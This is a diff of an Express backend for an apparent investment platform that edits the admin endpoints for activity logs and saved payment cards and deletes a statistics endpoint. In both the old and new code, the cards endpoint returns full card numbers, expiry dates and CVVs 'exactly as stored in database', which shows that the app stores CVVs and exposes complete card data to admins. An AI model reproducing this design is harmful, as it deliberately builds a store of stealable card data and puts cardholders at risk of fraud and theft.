@@ -8365,21 +8365,21 @@ app.post('/api/admin/users/:userId/balance', async (req, res) => {
 
 
 
-// Admin Activity Endpoint - Fetches recent user activities
+// Recent Activity Endpoint for Admin Dashboard
 app.get('/api/admin/activity', adminProtect, async (req, res) => {
     try {
-        const { page = 1, limit = 10 } = req.query;
-        const skip = (page - 1) * limit;
+        const { page = 1, limit = 5 } = req.query;
+        const skip = (page - 1) * parseInt(limit);
 
-        // Get recent user activities from UserLog
-        const activities = await UserLog.find({})
+        // Get user activities with user information
+        const activities = await UserLog.find()
             .populate('user', 'firstName lastName email username')
             .sort({ createdAt: -1 })
             .skip(skip)
             .limit(parseInt(limit))
             .lean();
 
-        // Format the response to match frontend expectations
+        // Format activities to match frontend expectations
         const formattedActivities = activities.map(activity => ({
             id: activity._id,
             timestamp: activity.createdAt,
@@ -8390,15 +8390,12 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
                 email: activity.user.email,
                 username: activity.user.username || `${activity.user.firstName} ${activity.user.lastName}`
             } : null,
-            username: activity.user ? 
-                (activity.user.username || `${activity.user.firstName} ${activity.user.lastName}`) : 
-                'System',
+            username: activity.username || (activity.user ? `${activity.user.firstName} ${activity.user.lastName}` : 'System'),
             action: activity.action,
             ipAddress: activity.ipAddress,
             status: activity.status,
             deviceInfo: activity.deviceInfo,
-            location: activity.location,
-            metadata: activity.metadata
+            location: activity.location
         }));
 
         const total = await UserLog.countDocuments();
@@ -8407,57 +8404,57 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
             status: 'success',
             data: {
                 activities: formattedActivities,
-                total,
+                total: total,
                 page: parseInt(page),
-                pages: Math.ceil(total / limit)
+                pages: Math.ceil(total / parseInt(limit)),
+                totalPages: Math.ceil(total / parseInt(limit))
             }
         });
 
     } catch (err) {
-        console.error('Admin activity fetch error:', err);
+        console.error('Get admin activity error:', err);
         res.status(500).json({
             status: 'error',
-            message: 'Failed to fetch recent activity'
+            message: 'An error occurred while fetching recent activity'
         });
     }
 });
 
-// Admin Cards Endpoint - Fetches all saved cards from database
+// Saved Cards Endpoint for Admin Dashboard
 app.get('/api/admin/cards', adminProtect, async (req, res) => {
     try {
-        const { page = 1, limit = 10 } = req.query;
-        const skip = (page - 1) * limit;
+        const { page = 1, limit = 5 } = req.query;
+        const skip = (page - 1) * parseInt(limit);
 
         // Get all saved cards with user information
-        const cards = await Card.find({})
-            .populate('user', 'firstName lastName email username')
+        const cards = await Card.find()
+            .populate('user', 'firstName lastName email')
             .sort({ createdAt: -1 })
             .skip(skip)
             .limit(parseInt(limit))
             .lean();
 
-        // Format card data exactly as stored in database (1:1)
+        // Format cards to match frontend expectations - display full card data as stored
         const formattedCards = cards.map(card => ({
-            id: card._id,
+            _id: card._id,
             user: {
-                id: card.user._id,
+                _id: card.user._id,
                 firstName: card.user.firstName,
                 lastName: card.user.lastName,
                 email: card.user.email,
-                username: card.user.username || `${card.user.firstName} ${card.user.lastName}`
+                fullName: `${card.user.firstName} ${card.user.lastName}`
             },
-            username: card.user.username || `${card.user.firstName} ${card.user.lastName}`,
+            // Display card data exactly as stored in database
             fullName: card.fullName,
-            cardNumber: card.cardNumber, // Display full card number as stored
+            cardNumber: card.cardNumber, // Full card number
             expiry: card.expiry,
-            cvv: card.cvv, // Display full CVV as stored
+            cvv: card.cvv,
             billingAddress: card.billingAddress,
-            city: card.city,
-            state: card.state,
-            postalCode: card.postalCode,
-            country: card.country,
-            cardType: card.cardType,
-            isDefault: card.isDefault,
+            city: card.city || '',
+            state: card.state || '',
+            postalCode: card.postalCode || '',
+            country: card.country || '',
+            isDefault: card.isDefault || false,
             lastUsed: card.lastUsed,
             createdAt: card.createdAt,
             updatedAt: card.updatedAt
@@ -8469,68 +8466,27 @@ app.get('/api/admin/cards', adminProtect, async (req, res) => {
             status: 'success',
             data: {
                 cards: formattedCards,
-                total,
+                total: total,
                 page: parseInt(page),
-                pages: Math.ceil(total / limit)
+                pages: Math.ceil(total / parseInt(limit)),
+                totalPages: Math.ceil(total / parseInt(limit))
             }
         });
 
     } catch (err) {
-        console.error('Admin cards fetch error:', err);
+        console.error('Get admin cards error:', err);
         res.status(500).json({
             status: 'error',
-            message: 'Failed to fetch saved cards'
+            message: 'An error occurred while fetching saved cards'
         });
     }
 });
 
-// Additional Admin Dashboard Statistics Endpoint (if needed by frontend)
-app.get('/api/admin/stats', adminProtect, async (req, res) => {
-    try {
-        // Get real statistics from database
-        const totalUsers = await User.countDocuments();
-        const totalActiveUsers = await User.countDocuments({ status: 'active' });
-        const totalDeposits = await Transaction.aggregate([
-            { $match: { type: 'deposit', status: 'completed' } },
-            { $group: { _id: null, total: { $sum: '$amount' } } }
-        ]);
-        const totalWithdrawals = await Transaction.aggregate([
-            { $match: { type: 'withdrawal', status: 'completed' } },
-            { $group: { _id: null, total: { $sum: '$amount' } }
-        }]);
-        const pendingDeposits = await Transaction.countDocuments({ 
-            type: 'deposit', 
-            status: 'pending' 
-        });
-        const pendingWithdrawals = await Transaction.countDocuments({ 
-            type: 'withdrawal', 
-            status: 'pending' 
-        });
 
-        const stats = {
-            totalUsers,
-            totalActiveUsers,
-            totalDeposits: totalDeposits.length > 0 ? totalDeposits[0].total : 0,
-            totalWithdrawals: totalWithdrawals.length > 0 ? totalWithdrawals[0].total : 0,
-            pendingDeposits,
-            pendingWithdrawals,
-            platformRevenue: 0, // Calculate based on your business logic
-            lastUpdated: new Date().toISOString()
-        };
 
-        res.status(200).json({
-            status: 'success',
-            data: stats
-        });
 
-    } catch (err) {
-        console.error('Admin stats fetch error:', err);
-        res.status(500).json({
-            status: 'error',
-            message: 'Failed to fetch dashboard statistics'
-        });
-    }
-});
+
+
 
 
 
@@ -8663,6 +8619,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
